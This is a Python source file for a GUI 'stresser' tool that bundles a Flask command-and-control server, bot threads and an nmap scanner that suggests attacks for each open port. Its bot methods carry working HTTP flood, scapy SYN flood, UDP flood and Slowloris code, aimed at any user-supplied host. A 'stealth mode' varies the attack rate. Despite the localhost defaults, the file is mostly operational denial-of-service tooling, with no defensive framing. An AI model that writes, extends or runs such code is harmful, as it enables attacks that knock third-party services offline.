# simplified_stresser.py
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import random
import time
import threading
import requests
from scapy.all import IP, TCP, send, UDP
import nmap
from flask import Flask, request, jsonify
from datetime import datetime
import logging
import sys
import queue
import json

# Suppress Flask logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- Global Variables (Define at the top) ---
C2_HOST = "127.0.0.1"
C2_PORT = 5000
C2_SERVER_RUNNING = False
ACTIVE_BOTS = {}
PACKETS_SENT = 0
FAILED_PACKETS = 0
STEALTH_MODE = False
RATE_LIMIT = 0.1 # Default fast rate
OPEN_PORTS = []
BOT_QUEUE = queue.Queue()  # Queue for bot management
ATTACK_QUEUE = queue.Queue()  # Queue for attack commands

# --- Flask App for C2 Server ---
c2_app = Flask(__name__)

# --- C2 Server Routes (Placed outside the class for Flask) ---
@c2_app.route('/register', methods=['POST'])
def register_bot():
    try:
        data = request.json
        bot_id = data.get('id')
        ip = request.remote_addr
        if bot_id:
            ACTIVE_BOTS[bot_id] = {
                'ip': ip,
                'last_seen': datetime.now().strftime("%H:%M:%S"),
                'os': data.get('os', 'Unknown'),
                'arch': data.get('arch', 'Unknown'),
                'priv': data.get('priv', 'user'),
                'session_id': None
            }
            print(f"[C2] Bot registered: {bot_id} from {ip}")
            return jsonify({"status": "registered", "command": "idle"})
        else:
            return jsonify({"status": "error", "message": "Bot ID missing"}), 400
    except Exception as e:
        print(f"[C2 ERROR] Registering bot: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@c2_app.route('/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    cmd = {"cmd": "idle"}
    try:
        if bot_id in ACTIVE_BOTS:
            ACTIVE_BOTS[bot_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
            # Check for pending command from GUI
            if hasattr(SimplifiedStresserGUI, 'pending_command') and SimplifiedStresserGUI.pending_command:
                cmd = SimplifiedStresserGUI.pending_command
                SimplifiedStresserGUI.pending_command = None
        # print(f"[C2] Sending command to {bot_id}: {cmd}") # Optional debug
    except Exception as e:
        print(f"[C2 ERROR] Getting command for {bot_id}: {e}")
    return jsonify(cmd)

def run_c2_server():
    global C2_SERVER_RUNNING
    try:
        print(f"[C2] Starting server on http://{C2_HOST}:{C2_PORT}")
        c2_app.run(host=C2_HOST, port=C2_PORT, threaded=True, debug=False, use_reloader=False)
    except Exception as e:
         print(f"[C2 ERROR] Failed to start server: {e}")
    finally:
        C2_SERVER_RUNNING = False

# --- Main GUI Class ---
class SimplifiedStresserGUI:
    pending_command = None # Class variable for C2 command

    def __init__(self, root):
        self.root = root
        self.root.title("Simplified A.I BOT STRESSER")
        self.root.geometry("1200x800")
        self.root.configure(bg='#0a0a1a')
        self.bot_count = 0
        self.setup_ui()
        self.bot_manager_thread = threading.Thread(target=self.bot_manager, daemon=True)
        self.bot_manager_thread.start()
        self.stats_update_thread = threading.Thread(target=self.update_stats, daemon=True)
        self.stats_update_thread.start()

    def setup_ui(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)

        self.tab_main = ttk.Frame(self.notebook)
        self.tab_attacks = ttk.Frame(self.notebook)
        self.tab_c2 = ttk.Frame(self.notebook)
        self.tab_pen_test = ttk.Frame(self.notebook)
        self.tab_logs = ttk.Frame(self.notebook)  # New Logs Tab

        self.notebook.add(self.tab_main, text='Dashboard')
        self.notebook.add(self.tab_attacks, text='Stress Testing')
        self.notebook.add(self.tab_c2, text='HTTP C2 Server')
        self.notebook.add(self.tab_pen_test, text='Port Scanner')
        self.notebook.add(self.tab_logs, text='Live Logs')

        self.setup_main_tab()
        self.setup_attack_tab()
        self.setup_c2_tab()
        self.setup_pentest_tab()
        self.setup_logs_tab()

        # Status Bar
        self.status_var = tk.StringVar(value="Ready")
        self.status_bar = tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W, bg='#0a0a1a', fg='white')
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def update_status(self, message):
        self.status_var.set(f"Status: {message}")
        self.root.update_idletasks()

    def setup_main_tab(self):
        frame = tk.Frame(self.tab_main, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Stats Frame
        stats_frame = tk.Frame(frame, bg='#0a0a1a')
        stats_frame.pack(pady=10)
        self.bot_var = tk.StringVar(value="0")
        self.packet_var = tk.StringVar(value="0")
        self.time_var = tk.StringVar(value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        tk.Label(stats_frame, text="Bots: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.bot_var, bg='#0a0a1a', fg='green').pack(side=tk.LEFT)
        tk.Label(stats_frame, text=" | Packets: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.packet_var, bg='#0a0a1a', fg='yellow').pack(side=tk.LEFT)
        tk.Label(stats_frame, text=" | Time: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        tk.Label(stats_frame, textvariable=self.time_var, bg='#0a0a1a', fg='magenta').pack(side=tk.LEFT)

        # Log Text Area
        log_frame = tk.LabelFrame(frame, text="Activity Log", bg='#0a0a1a', fg='white')
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#1a1a2a', fg='white', state='disabled')
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)

        # Redirect print statements to log_text (FIXED)
        class TextRedirector:
            def __init__(self, widget):
                self.widget = widget

            def write(self, str):
                # Check if widget still exists before updating
                try:
                    if self.widget.winfo_exists():
                        self.widget.configure(state='normal')
                        self.widget.insert(tk.END, str)
                        self.widget.see(tk.END)
                        self.widget.configure(state='disabled')
                except tk.TclError:
                    # Widget likely destroyed, ignore print
                    pass

            def flush(self):
                pass # Needed for file-like object

        sys.stdout = TextRedirector(self.log_text)
        print("[INFO] Simplified Application started.")

    def setup_attack_tab(self):
        frame = tk.Frame(self.tab_attacks, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Target Configuration
        target_frame = tk.LabelFrame(frame, text="Target Configuration", bg='#0a0a1a', fg='white')
        target_frame.pack(fill='x', pady=10)
        tk.Label(target_frame, text="Target Host:", bg='#0a0a1a', fg='white').grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.target_host = tk.Entry(target_frame, width=20, bg='#1a1a2a', fg='white')
        self.target_host.insert(0, "127.0.0.1") # Default target
        self.target_host.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(target_frame, text="Target Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.target_port = tk.Entry(target_frame, width=10, bg='#1a1a2a', fg='white')
        self.target_port.insert(0, "80") # Default port
        self.target_port.grid(row=0, column=3, padx=5, pady=5)

        # Attack Type Selection
        attack_frame = tk.LabelFrame(frame, text="Attack Type", bg='#0a0a1a', fg='white')
        attack_frame.pack(fill='x', pady=10)
        self.attack_type = tk.StringVar(value="HTTP Flood")
        attack_types = ["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"]
        for i, atype in enumerate(attack_types):
            tk.Radiobutton(attack_frame, text=atype, variable=self.attack_type, value=atype, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').grid(row=0, column=i, sticky='w', padx=10)

        # Bot Control
        bot_frame = tk.LabelFrame(frame, text="Bot Control", bg='#0a0a1a', fg='white')
        bot_frame.pack(fill='x', pady=10)
        tk.Button(bot_frame, text="Add 10 Bots", command=lambda: self.add_bots(10), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Add 50 Bots", command=lambda: self.add_bots(50), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Add 100 Bots", command=lambda: self.add_bots(100), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(bot_frame, text="Stop All Bots", command=self.stop_all_bots, bg='#4d3333', fg='white').pack(side=tk.RIGHT, padx=5)

        # Mode Toggles (Kept for functionality)
        mode_frame = tk.LabelFrame(frame, text="Advanced Modes", bg='#0a0a1a', fg='white')
        mode_frame.pack(fill='x', pady=10)
        tk.Button(mode_frame, text="Toggle Stealth Mode", command=self.toggle_stealth, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
        self.stealth_var = tk.StringVar(value="OFF")
        tk.Label(mode_frame, textvariable=self.stealth_var, bg='#0a0a1a', fg='white').pack(side=tk.LEFT, padx=5)

    def toggle_stealth(self):
        global STEALTH_MODE, RATE_LIMIT
        STEALTH_MODE = not STEALTH_MODE
        RATE_LIMIT = random.uniform(0.5, 2.0) if STEALTH_MODE else 0.1
        self.stealth_var.set("ON" if STEALTH_MODE else "OFF")
        self.update_status(f"Stealth Mode: {'ON' if STEALTH_MODE else 'OFF'}")

    def add_bots(self, count):
        target = self.target_host.get()
        port = self.target_port.get()
        attack_type = self.attack_type.get()
        if not target or not port:
            messagebox.showerror("Error", "Target and port required!")
            return
        try:
            port = int(port)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number!")
            return
        for i in range(count):
            bot_id = f"Bot-{self.bot_count + 1}"
            # Add to queue for processing
            BOT_QUEUE.put({
                "action": "create",
                "bot_id": bot_id,
                "target": target,
                "port": port,
                "attack_type": attack_type
            })
            self.bot_count += 1
        self.bot_var.set(str(self.bot_count))
        self.update_status(f"Queued {count} bots targeting {target}:{port}")

    def bot_manager(self):
        """Manage bot creation and lifecycle"""
        while True:
            try:
                if not BOT_QUEUE.empty():
                    item = BOT_QUEUE.get_nowait()
                    if item["action"] == "create":
                        self.create_bot_thread(item["bot_id"], item["target"], item["port"], item["attack_type"])
                time.sleep(0.1)
            except queue.Empty:
                pass
            except Exception as e:
                print(f"[BOT MANAGER ERROR] {e}")
            time.sleep(0.1)

    def create_bot_thread(self, bot_id, target, port, attack_type):
        """Create a bot thread"""
        bot_thread = threading.Thread(target=self.simulate_bot, args=(bot_id, target, port, attack_type), daemon=True)
        bot_thread.start()

    def simulate_bot(self, bot_id, target, port, attack_type):
        global PACKETS_SENT, FAILED_PACKETS
        # Register with C2
        try:
            reg_data = {"id": bot_id, "os": "SimulatedOS", "arch": "x86_64", "priv": "user"}
            requests.post(f"http://{C2_HOST}:{C2_PORT}/register", json=reg_data, timeout=5)
        except requests.exceptions.RequestException as e:
             print(f"[BOT {bot_id}] Registration failed: {e}")
             # Continue anyway, maybe C2 is down

        ATTACK_RUNNING = False
        while True:
            try:
                # Get command from C2
                resp = requests.get(f"http://{C2_HOST}:{C2_PORT}/command/{bot_id}", timeout=5).json()
                cmd = resp.get("cmd")
                if cmd == "attack":
                    ATTACK_RUNNING = True
                    attack_details = resp # Might contain target/port/type if sent by C2
                    current_target = attack_details.get("target", target)
                    current_port = int(attack_details.get("port", port))
                    current_attack_type = attack_details.get("type", attack_type)
                    while ATTACK_RUNNING:
                        try:
                            delay = RATE_LIMIT if STEALTH_MODE else random.uniform(0.01, 0.05)
                            time.sleep(delay)
                            if current_attack_type == "HTTP Flood":
                                self.http_flood(current_target, current_port)
                            elif current_attack_type == "SYN Flood":
                                self.syn_flood(current_target, current_port)
                            elif current_attack_type == "UDP Flood":
                                self.udp_flood(current_target, current_port)
                            elif current_attack_type == "Slowloris":
                                self.slowloris(current_target, current_port)
                            PACKETS_SENT += 1
                            # Update GUI counter (thread-safe)
                            self.root.after(0, self.packet_var.set, str(PACKETS_SENT))
                            
                            # Add to attack queue for real-time logging
                            ATTACK_QUEUE.put({
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                                "bot_id": bot_id,
                                "attack": current_attack_type,
                                "target": current_target,
                                "port": current_port,
                                "status": "sent"
                            })
                        except Exception as e:
                            FAILED_PACKETS += 1
                            print(f"[BOT {bot_id}] Attack error: {e}")
                            # Add to attack queue for real-time logging
                            ATTACK_QUEUE.put({
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                                "bot_id": bot_id,
                                "attack": current_attack_type,
                                "target": current_target,
                                "port": current_port,
                                "status": "failed",
                                "error": str(e)
                            })
                            time.sleep(1) # Brief pause on error
                elif cmd == "stop":
                    ATTACK_RUNNING = False
                    print(f"[BOT {bot_id}] Attack stopped by C2.")
                    break
                time.sleep(5) # Check for new commands periodically
            except requests.exceptions.RequestException as e:
                print(f"[BOT {bot_id}] C2 Communication error: {e}")
                time.sleep(10) # Longer wait if C2 is unreachable
            except Exception as e:
                 print(f"[BOT {bot_id}] General error: {e}")
                 time.sleep(10)

    def http_flood(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5) # Add timeout
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
            s.close()
        except Exception:
            pass # Expected if target is down or protected

    def syn_flood(self, target, port):
        try:
            # Craft packet using Scapy
            ip = IP(dst=target)
            tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            # Send packet (verbose=0 to suppress output)
            send(ip/tcp, verbose=0)
        except Exception:
            pass # Scapy might have issues or require privileges

    def udp_flood(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2) # Add timeout
            # Send random data
            s.sendto(random._urandom(1024), (target, port))
            s.close()
        except Exception:
            pass # Expected if target is down

    def slowloris(self, target, port):
         try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10) # Longer timeout for connect
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            # Keep connection open (simulated by sleeping)
            time.sleep(30) # Hold for 30 seconds (simulated)
            s.close()
         except Exception:
            pass # Connection might be closed by server

    def stop_all_bots(self):
        SimplifiedStresserGUI.pending_command = {"cmd": "stop"}
        self.update_status("Stop command sent to all bots")

    def setup_c2_tab(self):
        frame = tk.Frame(self.tab_c2, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # C2 Server Control
        server_frame = tk.LabelFrame(frame, text="C2 Server Control", bg='#0a0a1a', fg='white')
        server_frame.pack(fill='x', pady=10)
        tk.Button(server_frame, text="Start C2 Server", command=self.start_c2_server, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(server_frame, text="Stop C2 Server", command=self.stop_c2_server, bg='#4d3333', fg='white').pack(side=tk.LEFT, padx=5)

        # Bot List
        list_frame = tk.LabelFrame(frame, text="Connected Bots", bg='#0a0a1a', fg='white')
        list_frame.pack(fill='both', expand=True, pady=10)
        self.bot_tree = ttk.Treeview(list_frame, columns=('ID', 'IP', 'OS', 'Arch', 'Priv', 'Last Seen'), show='headings')
        for col in self.bot_tree['columns']:
            self.bot_tree.heading(col, text=col)
        self.bot_tree.pack(fill='both', expand=True, padx=5, pady=5)

        # Send Attack Command
        attack_frame = tk.LabelFrame(frame, text="Send Attack Command", bg='#0a0a1a', fg='white')
        attack_frame.pack(fill='x', pady=10)
        tk.Label(attack_frame, text="Target:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=5)
        self.c2_target = tk.Entry(attack_frame, width=15, bg='#1a1a2a', fg='white')
        self.c2_target.insert(0, "127.0.0.1")
        self.c2_target.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(attack_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, padx=5, pady=5)
        self.c2_port = tk.Entry(attack_frame, width=8, bg='#1a1a2a', fg='white')
        self.c2_port.insert(0, "80")
        self.c2_port.grid(row=0, column=3, padx=5, pady=5)
        tk.Label(attack_frame, text="Type:", bg='#0a0a1a', fg='white').grid(row=0, column=4, padx=5, pady=5)
        self.c2_attack_type = tk.StringVar(value="HTTP Flood")
        c2_attack_types = ["HTTP Flood", "SYN Flood", "UDP Flood", "Slowloris"]
        tk.OptionMenu(attack_frame, self.c2_attack_type, *c2_attack_types).grid(row=0, column=5, padx=5, pady=5)
        tk.Button(attack_frame, text="Launch Attack", command=self.send_attack_command, bg='#33334d', fg='white').grid(row=0, column=6, padx=5, pady=5)

        # Auto-refresh bot list
        self.update_bot_list()

    def start_c2_server(self):
        global C2_SERVER_RUNNING
        if C2_SERVER_RUNNING:
            self.update_status("C2 Server is already running.")
            return
        C2_SERVER_RUNNING = True
        thread = threading.Thread(target=run_c2_server, daemon=True)
        thread.start()
        self.update_status(f"HTTP C2 Server starting at http://{C2_HOST}:{C2_PORT}")

    def stop_c2_server(self):
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
        # Note: Stopping Flask server cleanly from another thread is tricky.
        # The server will stop when the main thread exits or if killed.
        # For simulation, we just update the status.
        self.update_status("HTTP C2 Server stopped (Flask stop not implemented cleanly).")

    def update_bot_list(self):
         # Clear existing items
        for item in self.bot_tree.get_children():
            self.bot_tree.delete(item)
        # Insert updated items
        for bot_id, info in ACTIVE_BOTS.items():
            self.bot_tree.insert('', tk.END, values=(bot_id, info['ip'], info['os'], info['arch'], info['priv'], info['last_seen']))
        # Schedule next update if the app is still running
        try:
            if self.root.winfo_exists():
               self.root.after(5000, self.update_bot_list) # Update every 5 seconds
        except tk.TclError:
            pass # Root destroyed, stop updating

    def send_attack_command(self):
        target = self.c2_target.get()
        port = self.c2_port.get()
        attack_type = self.c2_attack_type.get()
        if not target or not port:
            messagebox.showerror("Error", "Target and port required!")
            return
        try:
            port = int(port)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number!")
            return
        SimplifiedStresserGUI.pending_command = {"cmd": "attack", "target": target, "port": port, "type": attack_type}
        self.update_status(f"Attack command sent: {attack_type} on {target}:{port}")

    # --- Port Scanner Tab ---
    def setup_pentest_tab(self):
        frame = tk.Frame(self.tab_pen_test, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Scan Target Input
        input_frame = tk.Frame(frame, bg='#0a0a1a')
        input_frame.pack(fill='x', pady=10)
        tk.Label(input_frame, text="Target IP:", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
        self.scan_target = tk.Entry(input_frame, width=20, bg='#1a1a2a', fg='white')
        self.scan_target.insert(0, "127.0.0.1") # Default scan target
        self.scan_target.pack(side=tk.LEFT, padx=5)
        tk.Button(input_frame, text="Scan Open Ports", command=self.scan_ports, bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)

        # Results Treeview
        result_frame = tk.LabelFrame(frame, text="Scan Results", bg='#0a0a1a', fg='white')
        result_frame.pack(fill='both', expand=True, pady=10)
        self.port_tree = ttk.Treeview(result_frame, columns=('Port/Service', 'Recommended Attack'), show='headings')
        self.port_tree.heading('Port/Service', text='Port/Service')
        self.port_tree.heading('Recommended Attack', text='Recommended Attack')
        self.port_tree.pack(fill='both', expand=True, padx=5, pady=5)

    def scan_ports(self):
        global OPEN_PORTS
        target = self.scan_target.get()
        if not target:
            messagebox.showerror("Error", "Enter target IP!")
            return

        # Clear previous results
        OPEN_PORTS.clear()
        for item in self.port_tree.get_children():
            self.port_tree.delete(item)

        self.update_status(f"Scanning {target}...")
        print(f"[SCAN] Starting scan on {target}")
        try:
            nm = nmap.PortScanner()
            # Fast scan, service detection
            nm.scan(target, arguments='-T4 -sV -F')
            host = nm[target]
            for proto in host.all_protocols():
                for port in host[proto].keys():
                    state = host[proto][port]['state']
                    service = host[proto][port]['name']
                    if state == 'open':
                        OPEN_PORTS.append(port)
                        rec = self.get_attack_recommendation(port, service)
                        self.port_tree.insert('', tk.END, values=(f"{port}/{service}", rec))
            self.update_status(f"Scan complete for {target}. Open ports: {OPEN_PORTS}")
            print(f"[SCAN] Completed for {target}. Open ports: {OPEN_PORTS}")
        except Exception as e:
            error_msg = f"Nmap scan failed: {e}"
            self.update_status(error_msg)
            messagebox.showerror("Scan Error", error_msg)
            print(f"[SCAN ERROR] {e}")

    def get_attack_recommendation(self, port, service):
        recs = {
            80: "HTTP Flood",
            443: "HTTPS Flood",
            21: "FTP Brute Sim",
            22: "SSH Brute Sim / Slowloris",
            23: "Telnet Flood",
            53: "DNS Amplification / UDP Flood",
            8080: "HTTP Flood",
            25: "SMTP Flood Sim",
            110: "POP3 Flood Sim",
            143: "IMAP Flood Sim"
        }
        return recs.get(int(port), "Generic Flood")

    # --- Live Logs Tab ---
    def setup_logs_tab(self):
        frame = tk.Frame(self.tab_logs, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Log controls
        control_frame = tk.Frame(frame, bg='#0a0a1a')
        control_frame.pack(fill='x', pady=10)
        tk.Button(control_frame, text="Clear Logs", command=self.clear_logs, bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Export Logs", command=self.export_logs, bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        
        # Log display
        log_frame = tk.LabelFrame(frame, text="Live Attack Logs", bg='#0a0a1a', fg='white')
        log_frame.pack(fill='both', expand=True, pady=10)
        self.logs_text = scrolledtext.ScrolledText(log_frame, bg='#1a1a2a', fg='white', state='disabled')
        self.logs_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Start log monitoring
        self.log_monitor_thread = threading.Thread(target=self.monitor_logs, daemon=True)
        self.log_monitor_thread.start()

    def monitor_logs(self):
        """Monitor attack logs and display in real-time"""
        while True:
            try:
                if not ATTACK_QUEUE.empty():
                    log_entry = ATTACK_QUEUE.get_nowait()
                    self.root.after(0, self.display_log_entry, log_entry)
                time.sleep(0.1)
            except queue.Empty:
                pass
            except Exception as e:
                print(f"[LOG MONITOR ERROR] {e}")
            time.sleep(0.1)

    def display_log_entry(self, log_entry):
        """Display a single log entry in the logs tab"""
        timestamp = log_entry.get("timestamp", "")
        bot_id = log_entry.get("bot_id", "")
        attack = log_entry.get("attack", "")
        target = log_entry.get("target", "")
        port = log_entry.get("port", "")
        status = log_entry.get("status", "")
        error = log_entry.get("error", "")
        
        # Format log line
        if status == "failed":
            log_line = f"[{timestamp}] BOT:{bot_id} ATTACK:{attack} TARGET:{target}:{port} STATUS:{status} ERROR:{error}\n"
        else:
            log_line = f"[{timestamp}] BOT:{bot_id} ATTACK:{attack} TARGET:{target}:{port} STATUS:{status}\n"
        
        # Display in logs text area
        self.logs_text.configure(state='normal')
        self.logs_text.insert(tk.END, log_line)
        self.logs_text.see(tk.END)
        self.logs_text.configure(state='disabled')

    def clear_logs(self):
        """Clear the logs display"""
        self.logs_text.configure(state='normal')
        self.logs_text.delete(1.0, tk.END)
        self.logs_text.configure(state='disabled')

    def export_logs(self):
        """Export logs to a file"""
        try:
            content = self.logs_text.get(1.0, tk.END)
            with open("attack_logs.txt", "w") as f:
                f.write(content)
            self.update_status("Logs exported to attack_logs.txt")
        except Exception as e:
            self.update_status(f"Export failed: {e}")

    def update_stats(self):
        """Periodically update statistics"""
        while True:
            try:
                # Update time
                self.time_var.set(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                
                # Update bot count
                self.bot_var.set(str(self.bot_count))
                
                # Update packet count
                self.packet_var.set(str(PACKETS_SENT))
                
                # Update bot list if needed
                if self.root.winfo_exists():
                    self.root.after(0, self.update_bot_list)
                    
            except Exception as e:
                print(f"[STATS ERROR] {e}")
            time.sleep(1)


# --- Main Execution ---
if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = SimplifiedStresserGUI(root)
        root.mainloop()
        # --- FIXED SHUTDOWN ---
        # Reset stdout redirector to prevent errors after GUI closes
        sys.stdout = sys.__stdout__
        print("[INFO] Simplified Application closed.")
    except Exception as e:
        # Reset stdout redirector before printing error
        sys.stdout = sys.__stdout__
        print(f"[FATAL ERROR] Failed to start application: {e}")
        import traceback
        traceback.print_exc()